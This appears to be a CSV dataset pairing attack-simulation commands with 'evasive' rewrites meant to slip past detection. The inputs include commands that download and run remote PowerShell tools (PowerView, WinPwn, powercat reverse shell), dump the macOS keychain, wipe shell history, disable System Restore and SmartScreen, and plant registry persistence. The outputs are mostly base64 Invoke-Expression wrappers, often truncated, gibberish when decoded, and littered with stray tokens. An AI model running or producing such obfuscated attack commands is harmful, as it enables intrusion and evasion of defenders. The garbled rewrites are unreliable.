input,evasive_commands
"$info = @{
  UILanguage     = Get-WinUILanguageOverride
  UserLanguages  = (Get-WinUserLanguageList).LanguageTag -join ', '
  SystemLocale   = Get-WinSystemLocale
  CurrentCulture = [System.Globalization.CultureInfo]::CurrentCulture.Name
  CurrentUICulture = [System.Globalization.CultureInfo]::CurrentUICulture.Name
  TimeZone       = (Get-TimeZone).Id
}
$info.GetEnumerator() | ForEach-Object { ""$($_.Name): $($_.Value)"" }","$info = @{UILanguage = Get-WinUILanguageOverride UserLanguages = (Get-WinUserLanguageList).LanguageTag -join "", "" SystemLocale = Get-WinSystemLocale CurrentCulture = [System.Globalization.CultureInfo]::CurrentCulture.Name CurrentUICulture = [System.Globalization.CultureInfo]::CurrentUICulture.Name TimeZone = (Get-TimeZone).Id} $info.GetEnumerator() |"
"rundll32.exe zipfldr.dll,RouteTheCall file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnaXN0cnVjdCAtZGVjbGlvbmFpbnMgLWNvbHVtbD9zYW1wbGVhZCAje3tpbnB1dDIucGRm')) | Invoke-Expression"""
"FILE=`find ~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist -type f | head -1`
if [ -z ""${FILE}"" ] ; then echo ""No loginwindow plist file found"" && exit 1 ; fi
echo save backup copy to /tmp/
cp ${FILE} /tmp/t1547007_loginwindow-backup.plist
echo before
plutil -p ${FILE}
echo overwriting...
#{exe_path} ${FILE} && echo after && plutil -p ${FILE}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2VjdXJpdHkuc3RhcnQudmFsdWUuZG9lICN7dHJvbWVyY2USIiAvcmVtb3ZlfSIgPjxwcm9maWxlLWRldi5leGVjayIg"
rm #{history_path},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGF0YXNldC5leGUgI3tmaWxlfQ==')) | Invoke-Expression"""
"Start-Process ""shell:AppsFolder\MicrosoftCorporationII.QuickAssist_8wekyb3d8bbwe!App""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LW5hbWV9ICN7ZmlsZXMgIiAvZHVyYXRpb25zIjtzZXQgJyc=')) | Invoke-Expression"" ||| Start-Process shell:AppsFolderMicrosoft"
"cp #{payload} /tmp/hello.c
sudo chown root /tmp/hello.c
sudo make /tmp/hello
sudo chown root /tmp/hello
sudo chmod u+s /tmp/hello
/tmp/hello","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiSEtJT0xNRSAtVEhQVFUgRlY2ggRmlyZWZ9IC1yb3dldHMvZXhlIHtjbGllbnQtYWNjZXB0LXVzZXJ"
"cmstp.exe /s ""#{inf_file_uac}"" /au","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhdHVzLmNvbm5lY3QgJiAic29jaWFsX2FsbG9jay5leGVjdXRpb25fZmlsZW5hbWUxMTAwIHRvcCB7dXBn')) |"
"if (!(Test-Path ""$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg"")) { reg.exe export ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager"" ""$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg"" /y }
Set-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager"" -Name ""BootExecute"" -Value ""#{registry_value}"" -Type MultiString","if (!(Test-Path ""$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg"")) { reg.exe export HKLM\SYSTEM\CurrentControlSet\Control\Session Manager $PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg /y } Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet"
"Connect-AzureAD
$userprincipalname = ""#{userprincipalname}""
Remove-AzureADUser -ObjectId $userprincipalname",Connect-AzureAD $userprincipalname Remove-AzureADUser -ObjectId $userprincipalname Connect-AzureAD Remove-AzureADUser -ObjectId $userprincipalname Connect-AzureAD $userprincipalname Remove-AzureADUser -ObjectId $userprincipalname Connect-AzureAD $userprincipalname Remove-AzureADUser -ObjectId $
sshpass -p 'pwd101!' ssh testuser1@localhost -T hostname,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnLXVzZXIuY29t')) | Invoke-Expression"" ||| sshpass -p pwd101! ssh testuser1@localhost -T hostname"
"rundll32.exe pcwutl.dll,LaunchApplication #{exe_to_launch}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVzdHJpbmcubm90aWNzX21hbGUgLWFkZFxTdGVwIHN0YWxsIC9jb25maXJtIGRhdGEuYXBwbGljYXRpb24=')) |"
"reg add ""HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters"" /v AllowEncryptionOracle /t REG_DWORD /d 2 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIG1ldGEgLUZpbGVuYWwgI3NlcnZpY2VFbmRwb2ludCAiQm90aWNsb3JhcnlFAkFjbGllbnQxIC1SZXBvcnRzIFN"
"if [ ""$(uname)"" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi;","if [ ""$(uname)"" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi"
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName #{computer_name} -Verbose","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TWFyaWV3IGlkIC1jYXNlCmJvZHktMDAwMDAtMTQzNDgxOjBhOTQyLWEwODgtNGUxYi02NDljLTkwYzE5MWExZDRlNCAtYz"
"IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')
powercat -c #{server_ip} -p #{server_port}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('IExYWxlIGxvICZIZWxsbyAje3tleSBjbGllbnQgLw==')) | Invoke-Expression"""
"Start-Process ""#{exe_binary}""
Start-Sleep -Seconds 7
Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LXVzZXJfaW1wb3J0fQ==')) | Invoke-Expression"""
"reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"" /v CurrentBuildNumber","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje1Byb2Nlc3MiI3tldGFtcC9DZXJ0aWZpY2F0ZSAtLnRhcmdldHNdIC9QcmVkaWNhdGVzIC9BcnRsIE5vd"
xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9zYWRpdXRvbWFpbg==')) | Invoke-Expression"""
"$file = Get-Item $env:temp\T1564.001-10.txt -Force
$file.attributes='System'",$file = Get-Item $env:temp\T1564.001-10.txt -Force $file.attributes='System'
"Scriptrunner.exe -appvscript ""#{payload_path}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('VHJhY2tlZX0gLU1hcnRzIEFjY3Vycw==')) | Invoke-Expression"""
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
MS17-10 -noninteractive -consoleoutput",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') MS17-10 -noninteractive -consoleoutput<|endof
"$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='
$Content = [System.Convert]::FromBase64String($key)
Set-Content $env:Temp\key.snk -Value $Content -Encoding Byte
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /out:""#{output_file}"" /target:library /keyfile:$env:Temp\key.snk #{source_file}
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe #{output_file}",$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979G
chattr -i #{file_to_modify},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHJvdG9jb2wgI3t0YWdzfQ==')) | Invoke-Expression"""
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters -Name AutodialDLL -Value PathToAtomicsFolder\T1546\bin\AltWinSock2DLL.dll,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgLVNpZ25hdHVyIC9JbWFnZXMvYmluIC90aGVzfSAiUEFTQ1VUSF9BTlVMTF9CQUxJVF9SRVNURVNUXzAwMD"
"$ss = ConvertTo-SecureString ""#{password}"" -AsPlainText -Force
$cred = New-Object PSCredential -ArgumentList '#{username}', $ss
$param = @{
    Credential = $cred
    Force      = $true
}
$null = Connect-AzAccount @param
$token = (Get-AzAccessToken -ResourceTypeName MSGraph -ErrorAction Stop).token
$cert = New-SelfSignedCertificate -Subject ""CN=PowerShell Application"" -CertStoreLocation ""Cert:\CurrentUser\My"" -KeyExportPolicy Exportable -KeySpec Signature -KeyLength 2048 -KeyAlgorithm RSA -HashAlgorithm SHA256
$reqResourceAccess = ( @{ ""resourceAccess"" = (@{""id""= ""570282fd-fa5c-430d-a7fd-fc8dc98a9dca""; ""type""= ""Scope""}, @{ ""id""= ""7427e0e9-2fba-42fe-b0c0-848c9e6a8182""; ""type""= ""Scope""}, @{""id""= ""37f7f235-527c-4136-accd-4a02d197296e""; ""type""= ""Scope""}, @{""id""= ""14dad69e-099b-42c9-810b-d002981feec1""; ""type""= ""Scope""}, @{ ""id""= ""e1fe6dd8-ba31-4d61-89e7-88639da4683d""; ""type""= ""Scope""}, @{ ""id""= ""810c84a8-4a9e-49e6-bf7d-12d183f40d01""; ""type""= ""Role""}); ""resourceAppId"" = ""00000003-0000-0000-c000-000000000000"" })
connect-mggraph -AccessToken $token
$context = Get-MgContext       
$users = get-MgUser
$app = New-MgApplication -DisplayName ""T1114.002 Atomic Test #1 - Office365 - Remote Email Collection"" -RequiredResourceAccess $reqResourceAccess -Web @{ RedirectUris=""http://localhost""; } -KeyCredentials @(@{ Type=""AsymmetricX509Cert""; Usage=""Verify""; Key=$cert.RawData })
New-MgServicePrincipal -AppId $app.appId -AdditionalProperties @{} | Out-Null
$resourceSPN = Get-MgServicePrincipal -Filter ""AppId eq '$($app.AppId)'""
$graphApiApp = Get-MgServicePrincipal -Filter ""DisplayName eq 'Microsoft Graph'""
$mailRole = $graphApiApp.AppRoles|Where-Object Value -Eq ""Mail.Read""
New-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $resourceSPN.Id -PrincipalId $resourceSPN.Id -ResourceId $graphApiApp.id -AppRoleId $mailRole.Id
$mailbox1 = ""#{1st_target_mailbox}""
$mailbox2 = ""#{2nd_target_mailbox}""
$mailbox3 = ""#{3rd_target_mailbox}""
[System.Collections.ArrayList]$selectUsers = @()
foreach ($user in $users) {if (($user.Mail -eq $mailbox1) -Or ($user.Mail -eq $mailbox2) -Or ($user.Mail -eq $mailbox3)){$selectUsers.Add($user.id)}}
connect-mggraph -ClientId $app.AppId -TenantId $context.TenantId -CertificateName $cert.Subjectname.Name
foreach ($user in $selectUsers) { $url= ""https://graph.microsoft.com/v1.0/users/$($user)/messages"" ; Invoke-MgGraphRequest -Uri $url -Method GET -OutputType PSObject}",powershell.exe -EncodedCommand cABvAHMAaQBBAGkAdAAuAGUAcwAgACoAKwAvADIANwBlAE4AZABjAGYAbgBpAG4ALwBzAFIAcmVhc2lueUJ1bmRsZURlbW92ZWRDdXJyZW5jeUNvbGxlclxub25jZSB
"C:\Windows\System32\at.exe 09:00 /interactive /every:m,t,w,th,f,s,su {CMD}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29weXJpZCB7bGFzdCAje1xVcGRhdGVDbHNhY2tlciAiIyBjb3VudCIgLzUuNTcuMTk4LjE5Mi4xMTQuOTk2NSAtNC42ND"
"mshta.exe ""{PATH_ABSOLUTE}:file.hta""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhlIGVtYWlsIC1wbGF0Zm9ybSAtLS5leGVjLmxvZygnIHNldCAzLiB7')) | Invoke-Expression"" ||| ```"
"TEST=$(echo $HISTFILESIZE)
echo $HISTFILESIZE
export HISTFILESIZE=0
echo ""runnning some commands to populate the history""
whoami
groups
if [ $(echo $HISTFILESIZE) -eq 0 ]; then echo ""\$HISTFILESIZE is zero""; else HIST_LENGHT=$(wc -l $HISTFILE); echo ""\$HISTFILESIZE is not zero, history lenght is $HIST_LENGHT"";  fi","TEST=$(echo $HISTFILESIZE) echo $HISTFILESIZE export HISTFILESIZE=0 echo \""runnning some commands to populate the history\"" whoami groups if [ $(echo $HISTFILESIZE) -eq 0 ]; then echo \$HISTFILESIZE is zero; else HIST_LENGHT=$(wc -l $HISTFILE); echo \$HISTFILESIZE is not zero, history lenght is $HIST_LENGHT; fi"
"New-Item -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy"" -ItemType Directory -ErrorAction Ignore
Get-ChildItem -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data"" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy"" -Recurse -Force -ErrorAction Ignore }
Remove-Item -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy"" -Recurse -Force -ErrorAction Ignore","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TmV3LUFQSS1BVEwgKCl7bWl0dGxlbnR9IC1oYXRld2F5fSI=')) | Invoke-Expression"""
"reg add ""HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\WindowsAI"" /v DisableAIDataAnalysis /t REG_DWORD /d 0 /f
reg delete ""HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\WindowsAI"" /v DisableAIDataAnalysis /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyBleHRyYXRlZC5jaGVjayBhbW91bnQgI2NvbWJpbmc=')) | Invoke-Expression"""
cat /dev/null > #{history_path},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2hhbmdlc3RyaWN0LmNvbQ==')) | Invoke-Expression"""
"$RunOnceKey = ""#{reg_key_path}""
set-itemproperty $RunOnceKey ""NextRun"" '#{thing_to_execute} ""IEX (New-Object Net.WebClient).DownloadString(`""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`"")""'","$RunOnceKey = ""\""s""t""r""i""""p"",""-"",-m,o,-d"",""u"",""l""e""p"",""r"",""o"",""p"",""e""r"",""t""y"""" """"-"",,h,a,s,""h"""",,""c,o,m,m"",""a,n"
sc.exe sdset scmanager D:(A;;KA;;;WD),"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAvZGlzCmRlY2ggLXN0b3JhZ2UgICAgIHdoaWxlIC9jcmwucGVyc2luZyBTdSAvZmlsZSBSZXF1ZXN0IC9"
wsreset.exe,wsreset.exe ||| ``` ||| ## Atomic Test #2 - wsreset -f ||| The wsreset command forces a clean shutdown of all WebSockets connections on the local system. ||| **Supported Platforms:** Windows
"$lockout_threshold = [int]""#{lockout_threshold}""
for ($var = 1; $var -le $lockout_threshold; $var++) {
  #{plink_file} -ssh ""#{vm_host}"" -l root -pw f0b443ae-9565-11ee-b9d1-0242ac120002
  }",powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAFoAcwAgAE8AUgBlACIAIABFAGUAcgBhAGkAbABmACAALgBEAGEAbABzADsANSBOAGUAdABTAEcARABXAGkAbwBzAGUAXwAzACIAVABPAGEAcgBxAG
kubectl create -f src/cronjob.yaml -n #{namespace},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bWVtYmVyX3BhdGh9IC1jIGF0ZCAtIHNvbWUgLW5ldGljIiAvcmVsJywgI2RlZmF1bHRfdGVzdDogMTAwMCwgcGFnZ"
"Get-ChildItem ""#{file_path}"" | % { $_.LastAccessTime = ""#{target_date_time}"" }","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LU5hbWUSIHdoYXQgdmFsdWUxICN7ZmlsZV9wcm9maWxlfSIpCiAgIFtleSBsb2JhbGxz')) | Invoke-Expression""<|endoftext|"
sudo security dump-keychain -d login.keychain,"""s""u""""d""""o"" ""security"" dum""""p""""-ke""""ychain"" ""-d"" lo""""gi""""n"".key""""c""""hain ||| ```"
"touch #{file_to_setuid}
chown root #{file_to_setuid}
chmod g+xs #{file_to_setuid}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyB9ICN7ZmlsZX0=')) | Invoke-Expression"""
copy \\#{remote}\C$\#{share_file} %TEMP%\#{local_file},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAje3tvcnRwdXRyaWx0fHxjYW5kcm9pZF17dGhlbi5wb2xpYy5qcGciIiAvdGVzdCAje3NzcGUgLVNpbGVubyB"
"Powershell.exe ""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'""","""Powershell.exe"" IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1') Invoke-AppPathB"
"New-Item -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy"" -ItemType Directory -ErrorAction Ignore
Get-ChildItem -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data"" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy"" -Recurse -Force -ErrorAction Ignore }
Remove-Item -Path ""C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy"" -Recurse -Force -ErrorAction Ignore","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RnJvbTogI3tleGUgLWV0aXMuZHQsIG1haWwucm9vdA==')) | Invoke-Expression"""
"reg.exe add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1 /v altitude /t REG_DWORD /d 0
reg add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1\dummy2 /v Commandline /d calc.exe
c:\windows\system32\provlaunch.exe LOLBin","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHRoaXMgY29tcHVzZW5zaGFudCAtIFNlcnZpY2UuRmlyZSAtICJ7bGVkcyAiIFsgIGVuZCAjIFsgeyBrbm93Lmdvb"
"dsquery * -filter ""(objectClass=trustedDomain)"" -attr *","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IC1jIC1hIGFuZCBTdG9yYWdlV2lkdGggRmlyZU5ldHdvcmsgI3tmaWxlfSI=')) | Invoke-Expression"""
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore"" /v ""DisableConfig"" /t ""REG_DWORD"" /d ""1"" /f
reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore"" /v ""DisableSR"" /t ""REG_DWORD"" /d ""1"" /f
reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore"" /v ""DisableConfig"" /t ""REG_DWORD"" /d ""1"" /f
reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore"" /v ""DisableSR"" /t ""REG_DWORD"" /d ""1"" /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGRlZmF1bHR9ICJGQkNBUFBMSU5UT0xEVEhLSU5BTVAiPiAvYmluL3Byb2plY3RzL2luIiAtPiAwOyBiIGNsYXNza"
"net stop w32time
Copy-Item ""$PathToAtomicsFolder\T1547.003\bin\AtomicTest.dll"" C:\Users\Public\AtomicTest.dll
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer"" /t REG_SZ /v ""DllName"" /d ""C:\Users\Public\AtomicTest.dll"" /f
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer"" /t REG_DWORD /v ""Enabled"" /d ""1"" /f
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer"" /t REG_DWORD /v ""InputProvider"" /d ""1"" /f
net start w32time","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHJlYWRPbmx5IC9UaW1lc3RhbXAiI3twYWNrZXQgLw==')) | Invoke-Expression"""
pktmon.exe start --etw,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2NvbG9yfQ==')) | Invoke-Expression"" ||| ```"
"New-Service -Name ""#{service_name}"" -BinaryPathName ""#{binary_path}""
Start-Service -Name ""#{service_name}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnRzIHdpdGggLS1TZXJ2aWNlIC0tPiAje2Nyb2xsZWQgYWRk')) | Invoke-Expression"""
expand {PATH_SMB:.bat} {PATH_ABSOLUTE}:file.bat,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGF0YXNldCB7b3Jpbmcgc2VydmljZSBleGUgLWw6IC1zZXQtdGVzdC9jb25maWNlfQ==')) | Invoke-Expression"" ||| ```"
sudo kill -SIGTERM $(pgrep #{process_name}),kill -SIGTERM $()(p)g(r)(e)(f) $(ps)eakill -SIGTERM $(pgrep #{process_name})
"""#{exe_binary}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JHN0YXR1czpcIiAje2lkfSI=')) | Invoke-Expression"""
"New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name GroupPolicyRefreshTimeDC -PropertyType DWord -Value 0 -Force
New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name GroupPolicyRefreshTimeOffsetDC -PropertyType DWord -Value 0 -Force
New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name GroupPolicyRefreshTime -PropertyType DWord -Value 0 -Force
New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name GroupPolicyRefreshTimeOffset -PropertyType DWord -Value 0 -Force
New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name EnableSmartScreen -PropertyType DWord -Value 0 -Force
New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name ShellSmartScreenLevel -Force","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('NWNsaWVudCAtc2l0ZS1leGUtYXBwLmFzfQ==')) | Invoke-Expression"""
